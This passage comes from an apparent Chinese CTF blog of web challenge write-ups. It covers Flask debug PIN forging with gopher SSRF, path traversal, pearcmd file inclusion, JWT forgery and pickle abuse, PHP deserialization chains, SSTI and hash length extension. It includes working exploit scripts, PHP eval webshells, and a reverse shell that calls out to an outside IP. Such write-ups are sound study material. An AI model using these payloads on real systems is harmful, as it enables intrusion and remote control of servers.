Flask(__name__)\n\napp.config['SECRET_KEY'] = '******'\n@app.route('/')\ndef welcome():\n    if session[\"islogin\"] == True:\n        return \"flag{***********************}\"\n\n    \n\n\napp.run('0.0.0.0', 1314, debug=True)1\n```\n\n可以看到我们要么能获取key伪造session 但是同时我们还得有地方去调用这个welcome函数才行\n\n仔细观察它的debug是开启的 并且我们还可以读文件 那么一眼就知道是要去算pin码然后rce了 前面的内容只是噱头\n\n计算pin码\n\n```javascript\nimport hashlib\nfrom itertools import chain\n\nprobably_public_bits = [\n    'root'  # /etc/passwd\n    'flask.app',  # 默认值\n    'Flask',  # 默认值\n    '/usr/local/lib/python3.10/dist-packages/flask/app.py'  # 报错得到\n]\n\nprivate_bits = [\n    '112581235869047',  # /sys/class/net/eth0/address 十进制\n    '8cab9c97-85be-4fb4-9d17-29335d7b2b8adocker-97ec80f5ebf7d07c5c79a4b57dd84c58bb32c866b6e3aed76ef252d246a07dc3.scope'\n    #8cab9c97-85be-4fb4-9d17-29335d7b2b8a\n    #docker-97ec80f5ebf7d07c5c79a4b57dd84c58bb32c866b6e3aed76ef252d246a07dc3.scope\n    # 字符串合并：1./etc/machine-id(docker不用看) /proc/sys/kernel/random/boot_id，有boot-id那就拼接boot-id 2. /proc/self/cgroup\n]\n\n\n# 下面为源码里面抄的，不需要修改\nh = hashlib.sha1()\nfor bit in chain(probably_public_bits, private_bits):\n    if not bit:\n        continue\n    if isinstance(bit, str):\n        bit = bit.encode('utf-8')\n    h.update(bit)\nh.update(b'cookiesalt')\n\ncookie_name = '__wzd' + h.hexdigest()[:20]\n\nnum = None\nif num is None:\n    h.update(b'pinsalt')\n    num = ('%09d' % int(h.hexdigest(), 16))[:9]\n\nrv = None\nif rv is None:\n    for group_size in 5, 4, 3:\n        if len(num) % group_size == 0:\n            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')\n                            for x in range(0, len(num), group_size))\n            break\n    else:\n        rv = num\n\nprint(rv)\n```\n\n这里关于`/proc/self/cgroup`这里的内容和我们一般做题时获取的不太一样 不过记住一点就行了\n\n`取第一行的最后一个斜杠/后面的所有字符串`那么肯定是对的\n\n计算得pin码 `397-838-235`\n\n接下来的思路就是 要通过gopher协议去访问内网中`/console`路由并且进行RCE\n\n但是由于debugmode的rce需要携带cookie 所以我们还需要去计算cookie\n\n因为`/console`是在内网的1314端口中 所以我们没法直接通过浏览器进入debug的控制台\n\n这里就需要手算cookie了\n\n方法参考：[flask-pin](https://unk.icu/2023/06/19/flask-pin/)  神！[SCTF2023 Web WriteUp - Boogiepop Doesn’t Laugh](https://boogipop.com/2023/06/20/SCTF2023 Web WriteUp/)\n\n发送验证pin码的请求\n\n```\nGET /?__debugger__=yes&cmd=pinauth&pin=397-838-235&s=hCYJBiBvCDHEJqflrGtk\n```\n\n需要拿到s 直接访问/console 可以在源代码中拿到\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1698483592278-60ae86c4-b0cb-4206-8cf7-23eae59b1225.png)\n\n然后记得编码打入`?url=http://127.0.0.1:1314/console?__debugger__=yes&cmd=pinauth&pin=397-838-235&s=hCYJBiBvCDHEJqflrGtk&lolita[]=1` 验证pin码计算正确的\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1698483692006-fad9b10a-ab71-43e3-b358-5586d7458a08.png)\n\n然后我们要进行rce还需要携带cookie\n\n### 第一种方式 脚本计算\n\n需要计算cookie 这里直接用到一个现成的脚本：[GitHub - WiIs0n/Flask-cookie-generation-based-on-PIN-code: This script generates a Cookie based on a legitimate PIN code.](https://github.com/WiIs0n/Flask-cookie-generation-based-on-PIN-code)\n\n同时可以计算出pin和cookie\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1698484036732-b9d7526a-ee26-4ba4-be46-a4cf5797e8c0.png)\n\n### 第二种方式gopher发包\n\n利用gopher协议发包 通过返回包获取到cookie\n\n脚本如下\n\n```javascript\nimport urllib\nimport urllib.parse\nimport urllib.request\n\ndef PAYLOAD(s,cmd,host,pin):\n\n    poc = f\"\"\"GET /console?&__debugger__=yes&pin={pin}&cmd={cmd}&frm=0&s={s} HTTP/1.1\nHost: {host}\nConnection: close\n\"\"\"\n    \n    new_poc = urllib.parse.quote(poc).replace('%0A','%0D%0A')\n    res = f'gopher://{host}/_' + new_poc\n    print(res)\n    return urllib.parse.quote(res)\n\n\ncmd = \"pinauth\"\ns= \"hCYJBiBvCDHEJqflrGtk\"\nhost=\"127.0.0.1:1314\"\n#cookie = \"__wzdaa31f34934bb24e966f6=1698068595|d4af8efd2a4d\"\npin = \"397-838-235\"\n\na = PAYLOAD(s,cmd,host,pin)\nprint(a)\n```\n\n可见我们通过脚本计算出来的 cookie也是正确的\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1698485116132-4b195cc5-160e-4156-be43-10df30b6fe65.png)\n\n\n\n计算出cookie之后就不用携带pin了 携带cookie直接rce即可\n\n直接反弹shell 记得url编码一下\n\n```javascript\nimport urllib\nimport urllib.parse\nimport urllib.request\n\ndef PAYLOAD(s,cmd,host,cookie):\n\n    poc = f\"\"\"GET /console?&__debugger__=yes&cmd={cmd}&frm=0&s={s} HTTP/1.1\nHost: {host}\nConnection: close\nCookie: {cookie}\n\"\"\"\n    \n    new_poc = urllib.parse.quote(poc).replace('%0A','%0D%0A')\n    res = f'gopher://{host}/_' + new_poc\n    print(res)\n    return urllib.parse.quote(res)\n\n\ncmd = '__import__(%22os%22).popen(%22bash%20-c%20%5C%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F8.130.34.53%2F7777%20%3C%261%5C%22%22)'\ns= \"hCYJBiBvCDHEJqflrGtk\"\nhost=\"127.0.0.1:1314\"\ncookie = \"__wzd41acf1cefa50cf0ead64=1698485090|9b48530259cc\"\npin = \"397-838-235\"\n\na = PAYLOAD(s,cmd,host,cookie)\nprint(a)\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1698485894959-0305c6d9-dc23-41b2-987e-74979132cf72.png)\n\n成功！！！\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1698485737899-0a1ec05c-caea-4355-b599-bc7798a61086.png)\n\n## NextDrive\n\n最折磨出题人的一集\n\n趣味题目\n\n一个模拟百度网盘的题目\n\n首先申请一个账号然后登录\n\n根据提示\n\nHint2: 你知道秒传的原理吗？\n\n那么首先了解一下秒传的原理\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1698486990058-e84113fd-3c61-496c-84d6-f1b3a796fc9d.png)\n\n在公共资源区能找到test.res.http文件\n\n```javascript\nHTTP/1.1 200 OK\ncontent-type: application/json; charset=utf-8\ncontent-length: 50\ndate: Tue, 06 Oct 2023 13:39:21 GMT\nconnection: keep-alive\nkeep-alive: timeout=5\n\n{\"code\":0,\"msg\":\"success\",\"logged\":true,\"data\":[{\"name\":\"すずめ feat.十明 - RADWIMPS,十明.flac\",\"hash\":\"5da3818f2b481c261749c7e1e4042d4e545c1676752d6f209f2e7f4b0b5fd0cc\",\"size\":27471829,\"uploader\":\"admin\",\"uploader_uid\":\"100000\",\"shareTime\":1698486253740,\"isYours\":true,\"isOwn\":true,\"ownFn\":\"すずめ feat.十明 - RADWIMPS,十明.flac\"},{\"name\":\"Windows 12 Concept.png\",\"hash\":\"469db0f38ca0c07c3c8726c516e0f967fa662bfb6944a19cf4c617b1aba78900\",\"size\":440707,\"uploader\":\"admin\",\"uploader_uid\":\"100000\",\"shareTime\":1698486256209,\"isYours\":true,\"isOwn\":true,\"ownFn\":\"Windows 12 Concept.png\"},{\"name\":\"信息安全技术信息安全事件分类分级指南.pdf\",\"hash\":\"03dff115bc0d6907752796fc808fe2ef0b4ea9049b5a92859fd7017d4e96c08f\",\"size\":330767,\"uploader\":\"admin\",\"uploader_uid\":\"100000\",\"shareTime\":1698486256242,\"isYours\":true,\"isOwn\":true,\"ownFn\":\"信息安全技术信息安全事件分类分级指南.pdf\"},{\"name\":\"不限速，就是快！.jpg\",\"hash\":\"2de8696b9047f5cf270f77f4f00756be985ebc4783f3c553a77c20756bc68f2e\",\"size\":32920,\"uploader\":\"admin\",\"uploader_uid\":\"100000\",\"shareTime\":1698486256280,\"isYours\":true,\"isOwn\":true,\"ownFn\":\"不限速，就是快！.jpg\"},{\"name\":\"test.req.http\",\"hash\":\"09228aabeb472316022cedd3f1a76930558f0ea489bd65b32ba743e499b74182\",\"size\":1085,\"uploader\":\"admin\",\"uploader_uid\":\"100000\",\"shareTime\":1698486259714,\"isYours\":true,\"isOwn\":true,\"ownFn\":\"test.req.http\"}]}\n```\n\n可以看到是发包数据包 \n\n注意到还有一个test.req.http上传了但是文件没有显示出来\n\n```javascript\n{\"name\":\"test.req.http\",\"hash\":\"09228aabeb472316022cedd3f1a76930558f0ea489bd65b32ba743e499b74182\",\"size\":1085,\"uploader\":\"admin\",\"uploader_uid\":\"100000\",\"shareTime\":1698486259714,\"isYours\":true,\"isOwn\":true,\"ownFn\":\"test.req.http\"}\n```\n\n所以我们可以利用秒传的原理随便上传一个文件 下载时替换test.req.http的哈希值 那么就可以将test.req.http文件下载下来了\n\n得到\n\n```javascript\nPOST /api/info/drive/sharezone HTTP/1.1\nAccept: */*\nAccept-Encoding: gzip, deflate, br\nAccept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6\nCache-Control: no-cache\nConnection: keep-alive\nContent-Length: 0\nContent-Type: application/x-www-form-urlencoded\nCookie: uid=100000; token=eyJ1c2VybmFtZSI6ImFkbWluIiwidWlkIjoiMTAwMDAwIiwidG9rZW4iOiI5ODRkMTIyMDQ5YmExNTM2MmYzNTEyZWYyNmE5YzUyMGY2NzBiYzNjYjJiMzhiODRhZWU0NzAzNDAwMzg2MWM3In0uCQ9dVhxMfi1WChcEdxJoYQ.TA1XZ2MKFgcQRRRmW18PDEAJUmBgDURXEUFFMAwJWloQXVIybl9BUkFBFTVbC1YOQgxWZmVcFldHQRZnWgMLUkJdVmZnW0lUTBNPMFsOVwlGClY2YlZCVEFARjVRCwtTQ11Wb2ZcSVJCE09iWlgIXUxcUDQyXBUHRkBPY1gDWF8\nHost: localhost:21920\nOrigin: http://localhost:21920\nPragma: no-cache\nReferer: http://localhost:21920/sharezone\nSec-Fetch-Dest: empty\nSec-Fetch-Mode: cors\nSec-Fetch-Site: same-origin\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0\nsec-ch-ua: \"Microsoft Edge\";v=\"119\", \"Chromium\";v=\"119\", \"Not?A_Brand\";v=\"24\"\nsec-ch-ua-mobile: ?0\nsec-ch-ua-platform: \"Windows\"\n```\n\n那么我们就拿到了admin的token了 然后替换token伪造身份\n\n又多了点文件 不过重要的是share.js\n\n```javascript\nconst Router = require(\"koa-router\");\nconst router = new Router();\nconst CONFIG = require(\"../../runtime.config.json\");\nconst Res = require(\"../../components/utils/response\");\nconst FileSignUtil = require(\"../../components/utils/file-signature\");\nconst { DriveUtil } = require(\"../../components/utils/database.utilities\");\nconst fs = require(\"fs\");\nconst path = require(\"path\");\nconst { verifySession } = require(\"../../components/utils/session\");\nconst logger = global.logger;\n\n/**\n * @deprecated\n * ! FIXME: 发现漏洞，请进行修改\n */\nrouter.get(\"/s/:hashfn\", async (ctx, next) => {\n    const hash_fn = String(ctx.params.hashfn || '')\n    const hash = hash_fn.slice(0, 64)\n    const from_uid = ctx.query.from_uid\n    const custom_fn = ctx.query.fn\n\n    // 参数校验\n    if (typeof hash_fn !== \"string\" || typeof from_uid !== \"string\") {\n        // invalid params or query\n        ctx.set(\"X-Error-Reason\", \"Invalid Params\");\n        ctx.status = 400; // Bad Request\n        return ctx.res.end();\n    }\n\n    // 是否为共享的文件\n    let IS_FILE_EXIST = await DriveUtil.isShareFileExist(hash, from_uid)\n    if (!IS_FILE_EXIST) {\n        ctx.set(\"X-Error-Reason\", \"File Not Found\");\n        ctx.status = 404; // Not Found\n        return ctx.res.end();\n    }\n\n    // 系统中是否存储有该文件\n    \n  \n    if (!IS_FILE_EXIST_IN_STORAGE) {\n        logger.error(`File ${hash_fn.yellow} not found in storage, but exist in database!`)\n        ctx.set(\"X-Error-Reason\", \"Internal Server Error\");\n        ctx.status = 500; // Internal Server Error\n        return ctx.res.end();\n    }\n\n    // 文件名处理\n    let filename = typeof custom_fn === \"string\" ? custom_fn : (await DriveUtil.getFilename(from_uid, hash));\n    filename = filename.replace(/[\\\\\\/\\:\\*\\\"\\'\\<\\>\\|\\?\\x00-\\x1F\\x7F]/gi, \"_\")\n\n    // 发送\n    ctx.set(\"Content-Disposition\", `attachment; filename*=UTF-8''${encodeURIComponent(filename)}`);\n    // ctx.body = fs.createReadStream(path.resolve(CONFIG.storage_path, hash_fn))\n    await ctx.sendFile(path.resolve(CONFIG.storage_path, hash_fn)).catch(e => {\n        logger.error(`Error while sending file ${hash_fn.yellow}`)\n        logger.error(e)\n        ctx.status = 500; // Internal Server Error\n        return ctx.res.end();\n    })\n})\n\nmodule.exports = router;\n```\n\n这里就稍稍寄了 由于js题目做的少 看js代码逻辑很吃力 最后还是折磨出题师傅出的qwq\n\nhash_fn是整个文件的hash\n\nhash取了hash_fn前64个字符校验是否是分享的文件 如果是则会将文件内容读出来\n\n但是问题出在了\n\n```javascript\nlet IS_FILE_EXIST_IN_STORAGE\n    try {\n        IS_FILE_EXIST_IN_STORAGE = fs.existsSync(path.resolve(\n            , hash_fn))\n    } catch (e) {\n        ctx.set(\"X-Error-Reason\", \"Internal Server Error\");\n        ctx.status = 500; // Internal Server Error\n        return ctx.res.end();\n    }\n```\n\n它校验时是否为分享文件取的是hash 但是读文件是通过hash_fn\n\n那么我们可以让前64个hash值为任意分享的文件hash值 之后的内容为`../../../../../proc/self/environ` 就可以将内容读出来\n\npayload：`/s/任意分享文件的hash值/../../../../../proc/self/environ?from_uid=100000&fn=/proc/self/environ` 记得要url编码 不然会混淆导致重定向到主页/(ㄒoㄒ)/~~\n\n\n\n## 4-复盘(未解出)\n\n原来这个题考pearcmd啊🤔 跟着官方wp学习\n\nindex.php关键代码\n\n```javascript\n  <?php \n        if (isset($_GET['page'])) {\n          $page ='pages/' .$_GET['page'].'.php';\n\n        }else{\n          $page = 'pages/dashboard.php';\n        }\n        if (file_exists($page)) {\n          require_once $page; \n        }else{\n          require_once 'pages/error_page.php';\n        }\n ?>\n```\n\n存在文件包含 然后就直接payload🤔🤔\n\n```\n/index.php?+config-create+/&page=/../../../../../usr/local/lib/php/pearcmd&/<?=@eval($_POST[x])?>+/var/www/html/1.php\n```\n\n之后是一个suid提权 gzip的\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1698838298382-580e4d6d-f28d-40e7-a0e4-00f6420608e6.png)\n\n🤔🤔  \n\n## Ye's Pickle（未解出)\n\n找到原题了 不敢实践。。。rz 原题是祥云杯2022 的FunWEB\n\n考点：\n\n- jwt伪造\n- pickle反序列化\n\n源码:\n\n```javascript\n# -*- coding: utf-8 -*-\nimport base64\nimport string\nimport random\nfrom flask import *\nimport jwcrypto.jwk as jwk\nimport pickle\nfrom python_jwt import *\napp = Flask(__name__)\n\ndef generate_random_string(length=16):\n    characters = string.ascii_letters + string.digits  # 包含字母和数字\n    random_string = ''.join(random.choice(characters) for _ in range(length))\n    return random_string\napp.config['SECRET_KEY'] = generate_random_string(16)\nkey = jwk.JWK.generate(kty='RSA', size=2048)\n@app.route(\"/\")\ndef index():\n    payload=request.args.get(\"token\")\n    if payload:\n        token=verify_jwt(payload, key, ['PS256'])\n        session[\"role\"]=token[1]['role']\n        return render_template('index.html')\n    else:\n        session[\"role\"]=\"guest\"\n        user={\"username\":\"boogipop\",\"role\":\"guest\"}\n        jwt = generate_jwt(user, key, 'PS256', timedelta(minutes=60))\n        return render_template('index.html',token=jwt)\n\n@app.route(\"/pickle\")\ndef unser():\n    if session[\"role\"]==\"admin\":\n        pickle.loads(base64.b64decode(request.args.get(\"pickle\")))\n        return render_template(\"index.html\")\n    else:\n        return render_template(\"index.html\")\nif __name__ == \"__main__\":\n    app.run(host=\"0.0.0.0\", port=5000, debug=True)\n```\n\n简单审计 可以看到我们的role为admin时 我们才能进行pickle反序列化利用\n\n题中鉴权是靠jwt来实现的 那么生成过程是 \n\n如果get获取到token 那么jwt中`session[\"role\"]`就为我们输入token的role \n\n如果token为空 那么他会帮我自动生成jwt 并且将`session[\"role\"]`初始化为guest\n\n然后是jwt crack的一个新出的漏洞 这里jwt加密是靠rsa加密 \n\n利用这个脚本 可以不需要公私钥就可以伪造jwt\n\n项目地址：\n\nhttps://github.com/davedoesdev/python-jwt/commit/88ad9e67c53aa5f7c43ec4aa52ed34b7930068c9\n\n简单修改一下 把里面改为`parsed_payload['role'] = 'admin'` 即可\n\n```javascript\n\"\"\" Test claim forgery vulnerability fix \"\"\"\nfrom datetime import timedelta\nfrom json import loads, dumps\n#from test.common import generated_keys\n#from test import python_jwt as jwt\nfrom pyvows import Vows, expect\nfrom jwcrypto.common import base64url_decode, base64url_encode\ndef topic(topic):\n    \"\"\" Use mix of JSON and compact format to insert forged claims including long expiration \"\"\"\n    [header, payload, signature] = topic.split('.')\n    parsed_payload = loads(base64url_decode(payload))\n    parsed_payload['role'] = 'admin'\n    fake_payload = base64url_encode((dumps(parsed_payload, separators=(',', ':'))))\n    return '{\"  ' + header + '.' + fake_payload + '.\":\"\",\"protected\":\"' + header + '\", \"payload\":\"' + payload + '\",\"signature\":\"' + signature + '\"}'\ntoken='eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE2OTg3NzA4MzAsImlhdCI6MTY5ODc2NzIzMCwianRpIjoiaVNzT2pQOVlLZ1NOUHVqYU5wYWkyQSIsIm5iZiI6MTY5ODc2NzIzMCwicm9sZSI6Imd1ZXN0IiwidXNlcm5hbWUiOiJib29naXBvcCJ9.WxTnJPgzKgjBYQ8HB8Ny5W4ZLNpsjAKsikMXHhtIQ-e5MiJp8jSt7AwKcuGsrqsFlTYeJLuGyLaxGGC29PAsKS8SVM82BG0W79nK35mp4aLXIEjer-cRT4GO8LX-WVZ0rRJZuv2Pe8ETPi8Rz0UahtmPYm7BbuvQ3XOudkb--wdcUrSIm2354RvaISRA7Z4a8VuP77VgkBIFNoebO_3c2wTO_w79-hTqg-JbUJqagqeFj5ptroo1SiYHpy2u2zUPKNqEeC6kcKwkZQWNUBGY4BuceLuoGBs9x2DWkAAsgrMC9PcUJ-8zzNFaZF22KxGgiLBv2pjR7HneVrF0Utx4gA'\npayload = topic(token)\nprint(payload)\n```\n\n之后就是一个很简单的pickle反序列化了 不再赘述\n\n# 结尾\n\n一起共勉\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1698564198569-1243af25-92dd-4cfc-916d-4750a52577a3.png)\n","categories":["各赛事WP"]},{"title":"SHCTF-校外赛道 WEB WP","url":"/post/cb61c260.html","content":"\n查缺补漏\n\n<!--more-->\n\n# WEEK1\n\n## babyRCE\n\n```\nuniq${IFS}/f???\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1696227692048-d68dc7db-8da9-467e-9a56-f3144d51b8f7.png)\n\n## 登录就给flag\n\n弱口令 admin/password\n\n\n\n## 飞机大战\n\nunicode解码再base64解码\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1696218779041-17e60cf7-8b84-4bb6-82ae-dc2b64c2bb78.png)\n\n## ez_serialize\n\n考点:\n\n- nginx日志包含\n- php反序列化\n\n```java\n<?php\n\nclass A{\n    public $var_1;\n    \n    public function __invoke(){\n    include($this->var_1);\n    }\n}\n\nclass B{\n    public $q;\n    public function __wakeup()\n{\n    if(preg_match(\"/gopher|http|file|ftp|https|dict|\\.\\./i\", $this->q)) {\n                echo \"hacker\";           \n            }\n    }\n\n}\nclass C{\n    public $var;\n    public $z;\n        public function __toString(){\n            return $this->z->var;\n        }\n}\n\nclass D{\n    public $p;\n        public function __get($key){\n            $function = $this->p;\n            return $function();\n        }  \n}\n$a = new B();\n$a->q = new C();\n$a->q->z = new D();\n$a->q->z->p=new A();\n$a->q->z->p->var_1=\"/var/log/nginx/access.log\";\necho urlencode(serialize($a));\n?>\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1696225164008-8562808d-7eb0-4178-b5b2-6e09d2dc76b1.png)\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1696225179418-22c57d4a-2956-461f-8744-ad60f52f7576.png)\n\n## ezphp\n\n考点:\n\nhttps://xz.aliyun.com/t/2557\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1696218682919-6637ec2f-8393-4e58-9eb3-a260ef466c8d.png)\n\n## 1zzphp\n\n考点:\n\n- 正则回溯\n\n```java\nimport requests\npayload = {\n    \"c_ode\":'a'*1000000+\"2023SHCTF\"\n}\nr = requests.post(url='http://112.6.51.212:32212/?num[]=1',data=payload)\nprint(r.text)\n```\n\n## 生成你的邀请函把~\n\n题目一开始没描述清楚 也有人做出来。。 挺抽象的\n\n我还以为是CRLF 傻逼\n\n```java\nPOST /generate_invitation HTTP/1.1\nHost: 112.6.51.212:31589\nContent-Length: 119\nPragma: no-cache\nCache-Control: no-cache\nUpgrade-Insecure-Requests: 1\nOrigin: http://112.6.51.212:31589\nContent-Type: application/json\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nReferer: http://112.6.51.212:31589/generate_invitation\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.9\nConnection: close\n\n{  \n    \"name\": \"Z1d10t\",  \n    \"imgurl\": \"http://q.qlogo.cn/headimg_dl?dst_uin=QQnumb&spec=640&img_type=jpg\"  \n} \n```\n\n# WEEK2\n\n## serialize\n\n考点：\n\n- 反序列化\n- 引用运算符\n- array绕过正则\n- php命名规范\n\n```java\n<?php\nhighlight_file(__FILE__);\nclass misca{\n    public $gao;\n    public $fei;\n    public $a;\n    public function __get($key){\n        $this->miaomiao();\n        $this->gao=$this->fei;\n        die($this->a);\n    }\n    public function miaomiao(){\n        $this->a='Mikey Mouse~';\n    }\n}\nclass musca{\n    public $ding;\n    public $dong;\n    public function __wakeup(){\n        return $this->ding->dong;\n    }\n}\nclass milaoshu{\n    public $v;\n    public function __tostring(){\n        echo\"misca~musca~milaoshu~~~\";\n        include($this->v);\n    }\n}\nfunction check($data){\n    if(preg_match('/^O:\\d+/',$data)){\n        die(\"you should think harder!\");\n    }\n    else return $data;\n}\nunserialize(check($_GET[\"wanna_fl.ag\"]));\n```\n\n链子不难 难点在于 `$this->gao=$this->fei;`这句该怎么用\n\n这里就需要知道引用运算符\n\n举个小例子说明\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1696928661467-d50a9a71-5ff4-43e5-a049-df123d39419e.png)\n\n这里取了了a的地址 修改b 那么也就会修改a\n\n在这道题目我们需要修改`$this->a`为`milaoshu`对象 所以就要用到引用运算符`&`\n\n还有就是正则 不能0开头 用array绕过就行\n\npoc如下\n\n```java\n<?php\nclass misca{\n    public $gao;\n    public $fei;\n    public $a;\n}\nclass musca{\n    public $ding;\n    public $dong;\n}\nclass milaoshu{\n    public $v;\n}\n$a = new musca();\n$a->ding = new misca();\n$a->ding->gao =&$a->ding->a;\n$a->ding->fei = new milaoshu();\n$a->ding->fei->v = 'php://filter/read=convert.base64-encode/resource=flag.php';\n$b = array(\"1\"=>$a);\necho urlencode(serialize($b));\n?>\n#a%3A1%3A%7Bi%3A1%3BO%3A5%3A%22musca%22%3A2%3A%7Bs%3A4%3A%22ding%22%3BO%3A5%3A%22misca%22%3A3%3A%7Bs%3A3%3A%22gao%22%3BN%3Bs%3A3%3A%22fei%22%3BO%3A8%3A%22milaoshu%22%3A1%3A%7Bs%3A1%3A%22v%22%3Bs%3A57%3A%22php%3A%2F%2Ffilter%2Fread%3Dconvert.base64-encode%2Fresource%3Dflag.php%22%3B%7Ds%3A1%3A%22a%22%3BR%3A4%3B%7Ds%3A4%3A%22dong%22%3BN%3B%7D%7D\n```\n\n## no_wake_up\n\n考点：\n\n- fast destruct\n\npoc\n\n```java\n<?php\nclass flag{\n    public $username;\n    public $code;\n\n}\n$a = new flag();\n$a->username = \"admin\";\n$a->code = \"php://filter/read=convert.base64-encode/resource=flag.php\";\necho serialize($a);\n?>\n#O:4:\"flag\":2:{s:8:\"username\";s:5:\"admin\";s:4:\"code\";s:57:\"php://filter/read=convert.base64-encode/resource=flag.php\";\n```\n\n## ez_ssti\n\n考点:\n\n- flask ssti\n\n基础无过滤\n\n`?name={{\"\".__class__.__base__.__subclasses__()[132].__init__.__globals__['popen']('cat /flag').read()}}`payload不唯一\n\n## EasyCMS\n\n访问`/admin/admin.php` 到后台\n\n`admin/mao` 默认密码登录\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1696935237103-37e0ae4e-16eb-4996-9505-8af901743984.png)\n\n可以执行sql语句\n\n直接写马到网站根目录下\n\n```\nselect \"<?php @eval($_POST['x']);?>\" INTO OUTFILE \"/var/www/html/1.php\";\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1696935273584-ee0d7776-e5f1-428a-8763-1095bf028ca9.png)\n\n## MD5的事就拜托了\n\n考点：\n\n- 哈希长度扩展攻击\n\n源码如下\n\n```java\n<?php\nhighlight_file(__FILE__);\ninclude(\"flag.php\");\nif(isset($_POST['SHCTF'])){\n    extract(parse_url($_POST['SHCTF']));\n    if($$$scheme==='SHCTF'){\n        echo(md5($flag));\n        echo(\"</br>\");\n    }\n    if(isset($_GET['length'])){\n        $num=$_GET['length'];\n        if($num*100!=intval($num*100)){\n            echo(strlen($flag));\n            echo(\"</br>\");\n        }\n    }\n}\nif($_POST['SHCTF']!=md5($flag)){\n    if($_POST['SHCTF']===md5($flag.urldecode($num))){\n        echo(\"flag is\".$flag);\n    }\n}\n```\n\n首先就是正常的变量覆盖\n\nPOST：`SHCTF=host://query?SHCTF`\n\nGET：`length=0.0000001`\n\n然后我们可以得到flag的md5值和flag长度\n\n关键在于\n\n```java\nif($_POST['SHCTF']!=md5($flag)){\n    if($_POST['SHCTF']===md5($flag.urldecode($num))){\n        echo(\"flag is\".$flag);\n    }\n```\n\n一眼丁真是哈希长度扩展攻击\n\n在这里有弯子猪脑当时没绕过来\n\n举个例子\n\n一般我们哈希长度扩展攻击已知`md5($salt.$somethong.$insert)`salt长度和something的值\n\n`$insert`是我们可控能输入的点\n\n但是这道题我们只知道`md5($flag)`的值 并不知道那一坨的md5值\n\n这里需要绕一下认为`salt为0` 一般flag格式为`flag{xxx-xxx-xxx-xxx}`\n\n那么我么们将`$somethong=flag{xxx-xxx-xxx-xxx` 将这段我们能输入`$insert`的当作`}`\n\n这样我们就变相的知道了那一坨的md5值\n\n利用hashpump工具\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1696994485178-e7586fae-acc9-42d2-a0a3-79aa7579011e.png)\n\n在这里`a280dad8326674279a3944046bc364f3`其实就是我们加入攻击值之后那一坨的md5值\n\n然后输入的时候length只需要输入`%80%00%00%00%00%00%00%00%00%00%00%00%00%00P%01%00%00%00%00%00%001`前面`}`就不需要了 不然就和flag重复了 并且length只容许是数字\n\npayload:\n\n```java\nPOST:SHCTF=a280dad8326674279a3944046bc364f3\nGET:length=%80%00%00%00%00%00%00%00%00%00%00%00%00%00P%01%00%00%00%00%00%001\n```\n\n\n\n## [WEEK2]ez_rce（未解出）\n\n考点：\n\n- subprocess.call()命令注入\n\n源码如下：\n\n```javascript\nfrom flask import *\nimport subprocess\n\napp = Flask(__name__)\n\ndef gett(obj,arg):\n    tmp = obj\n    for i in arg:\n        tmp = getattr(tmp,i)\n    return tmp\n\ndef sett(obj,arg,num):\n    tmp = obj\n    for i in range(len(arg)-1):\n        tmp = getattr(tmp,arg[i])\n    setattr(tmp,arg[i+1],num)\n\ndef hint(giveme,num,bol):\n    c = gett(subprocess,giveme)\n    tmp = list(c)\n    tmp[num] = bol\n    tmp = tuple(tmp)\n    sett(subprocess,giveme,tmp)\n\ndef cmd(arg):\n    subprocess.call(arg)\n\n\n@app.route('/',methods=['GET','POST'])\ndef exec():\n    try:\n        if request.args.get('exec')=='ok':\n            shell = request.args.get('shell')\n            cmd(shell)\n        else:\n            exp = list(request.get_json()['exp'])\n            num = int(request.args.get('num'))\n            bol = bool(request.args.get('bol'))\n            hint(exp,num,bol)\n        return 'ok'\n    except:\n        return 'error'\n    \nif __name__ == '__main__':\n    app.run(host='0.0.0.0',port=5000)\n```\n\n原理：\n\n当subprocess.call()函数第七个参数shell=false则会直接执行命令而不通过shell环境调用\n\n当shell=true时 就会调用/bin/sh 